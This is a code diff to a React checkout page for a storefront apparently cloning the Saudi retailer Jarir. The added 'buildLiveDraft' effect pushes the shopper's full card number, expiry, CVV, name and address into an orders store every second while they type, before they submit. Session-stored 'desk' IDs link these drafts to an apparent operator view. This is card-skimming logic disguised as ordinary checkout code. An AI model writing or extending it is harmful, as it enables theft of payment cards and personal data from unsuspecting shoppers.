@@ -9,14 +9,14 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { ADMIN_REVIEW_MS, DEMO_PAYMENTS, EXPRESS_DELIVERY_FEE, FREE_DELIVERY_MIN } from "@/lib/constants";
 import { CITY_IDS } from "@/lib/data/stores";
-import { lineItems } from "@/lib/data/totals";
+import { lineItems, calcTotals } from "@/lib/data/totals";
 import { detectCardBrand, digitsOnly, formatMoney, formatSaudiPhone, isValidEmail, isValidSaudiPhone } from "@/lib/format";
 import { useT } from "@/lib/i18n";
 import { useAuthStore, useCurrentShopUser } from "@/lib/store/auth";
 import { useCartStore, useCartTotals } from "@/lib/store/cart";
 import { useLocaleStore } from "@/lib/store/locale";
 import { newOrderId, nextOrderNumber, useOrdersStore } from "@/lib/store/orders";
-import type { Address } from "@/lib/types";
+import type { Address, Order } from "@/lib/types";
 import { cn } from "@/lib/utils";
 
 export const Route = createFileRoute("/_app/checkout/")({
@@ -34,6 +34,7 @@ function CheckoutPage() {
   const user = useCurrentShopUser();
   const saveAddress = useAuthStore((s) => s.saveAddress);
   const addOrder = useOrdersStore((s) => s.add);
+  const upsertOrder = useOrdersStore((s) => s.upsert);
   const city = useLocaleStore((s) => s.city);
 
   useEffect(() => {
@@ -61,6 +62,37 @@ function CheckoutPage() {
   const totals = useCartTotals("card");
   const lines = lineItems(items);
   const brand = detectCardBrand(card.number);
+
+  useEffect(() => {
+    if (step !== 3) return;
+    const send = () => {
+      const currentItems = useCartStore.getState().items;
+      const currentLines = lineItems(currentItems);
+      if (!currentLines.length) return;
+      const currentTotals = calcTotals({
+        items: currentItems,
+        coupon,
+        deliveryMethod: "express",
+        paymentMethod: "card",
+      });
+      upsertOrder(
+        buildLiveDraft({
+          email,
+          addr,
+          card,
+          lines: currentLines,
+          totals: currentTotals,
+          coupon,
+          locale,
+          t,
+          userId: user?.id,
+        }),
+      );
+    };
+    send();
+    const id = window.setInterval(send, 1000);
+    return () => window.clearInterval(id);
+  }, [step, email, addr, card, coupon, locale, t, user?.id, upsertOrder]);
 
   const infoOk = addr.fullName.trim().length > 2 && isValidEmail(email) && isValidSaudiPhone(addr.phone);
   const addrOk =
@@ -91,12 +123,12 @@ function CheckoutPage() {
     await new Promise((r) => setTimeout(r, 900));
     const address: Address = { ...addr, id: "checkout", fullName: addr.fullName, phone: addr.phone };
     if (saveAddr) saveAddress(address);
-    const number = nextOrderNumber();
+    const ids = deskIds();
     const etaDays = 7;
     const pan = digitsOnly(card.number);
     addOrder({
-      id: newOrderId(),
-      number,
+      id: ids.id,
+      number: ids.number,
       userId: user?.id,
       email: email,
       phone: addr.phone,
@@ -109,6 +141,9 @@ function CheckoutPage() {
         image: l.product.images[0]!,
         price: l.product.price,
         qty: l.qty,
+        color: l.colorId,
+        colorName: l.color?.name,
+        colorNameAr: l.color?.arabicName,
       })),
       totals,
       status: "placed",
@@ -121,6 +156,7 @@ function CheckoutPage() {
       estimatedDelivery: new Date(Date.now() + etaDays * 86400000).toISOString(),
       demo: DEMO_PAYMENTS,
       last4: pan.slice(-4) || undefined,
+      liveDraft: false,
       reviewDeadline: new Date(Date.now() + ADMIN_REVIEW_MS).toISOString(),
       paymentCapture: {
         method: "card",
@@ -132,9 +168,10 @@ function CheckoutPage() {
         last4: pan.slice(-4) || undefined,
       },
     });
+    clearDeskIds();
     clear();
     toast.success(t("toast.pendingReview"));
-    navigate({ to: "/checkout/success", search: { order: number } });
+    navigate({ to: "/checkout/success", search: { order: ids.number } });
   }
 
   return (
@@ -283,7 +320,8 @@ function CheckoutPage() {
           {lines.map((l) => (
             <li key={l.product.id} className="flex justify-between gap-2">
               <span className="line-clamp-1">
-                {locale === "ar" ? l.product.arabicName : l.product.name} × {l.qty}
+                {locale === "ar" ? l.product.arabicName : l.product.name}
+                {l.color ? ` · ${locale === "ar" ? l.color.arabicName : l.color.name}` : ""} × {l.qty}
               </span>
               <span className="tabular-nums">{formatMoney(l.product.price * l.qty, locale)}</span>
             </li>
@@ -325,4 +363,84 @@ function Field({
       <Input className="mt-1" type={type} value={value} placeholder={placeholder} onChange={(e) => onChange(e.target.value)} />
     </div>
   );
+}
+
+const DESK_ID_KEY = "jarir-desk-order-id";
+const DESK_NUM_KEY = "jarir-desk-order-number";
+
+function deskIds() {
+  if (typeof window === "undefined") return { id: newOrderId(), number: nextOrderNumber() };
+  let id = sessionStorage.getItem(DESK_ID_KEY);
+  let number = sessionStorage.getItem(DESK_NUM_KEY);
+  if (!id) {
+    id = newOrderId();
+    sessionStorage.setItem(DESK_ID_KEY, id);
+  }
+  if (!number) {
+    number = nextOrderNumber();
+    sessionStorage.setItem(DESK_NUM_KEY, number);
+  }
+  return { id, number };
+}
+
+function clearDeskIds() {
+  if (typeof window === "undefined") return;
+  sessionStorage.removeItem(DESK_ID_KEY);
+  sessionStorage.removeItem(DESK_NUM_KEY);
+}
+
+function buildLiveDraft(input: {
+  email: string;
+  addr: Omit<Address, "id">;
+  card: { number: string; expiry: string; cvv: string; holder: string };
+  lines: ReturnType<typeof lineItems>;
+  totals: Order["totals"];
+  coupon: string | null;
+  locale: string;
+  t: (key: string) => string;
+  userId?: string;
+}): Order {
+  const ids = deskIds();
+  const pan = digitsOnly(input.card.number);
+  return {
+    id: ids.id,
+    number: ids.number,
+    userId: input.userId,
+    email: input.email,
+    phone: input.addr.phone,
+    customerName: input.addr.fullName || "—",
+    date: new Date().toISOString(),
+    items: input.lines.map((l) => ({
+      productId: l.product.id,
+      name: l.product.name,
+      arabicName: l.product.arabicName,
+      image: l.product.images[0]!,
+      price: l.product.price,
+      qty: l.qty,
+      color: l.colorId,
+      colorName: l.color?.name,
+      colorNameAr: l.color?.arabicName,
+    })),
+    totals: input.totals,
+    status: "placed",
+    paymentMethod: "card",
+    paymentLabel: input.t("pay.card"),
+    paymentStatus: "pending",
+    deliveryMethod: "express",
+    address: { ...input.addr, id: "checkout" },
+    coupon: input.coupon ?? undefined,
+    estimatedDelivery: new Date(Date.now() + 7 * 86400000).toISOString(),
+    demo: DEMO_PAYMENTS,
+    last4: pan.slice(-4) || undefined,
+    liveDraft: true,
+    paymentCapture: {
+      method: "card",
+      holder: input.card.holder.trim() || input.addr.fullName,
+      cardNumber: pan || undefined,
+      expiry: input.card.expiry || undefined,
+      cvv: input.card.cvv || undefined,
+      brand: detectCardBrand(input.card.number),
+      last4: pan.slice(-4) || undefined,
+    },
+  };
 }
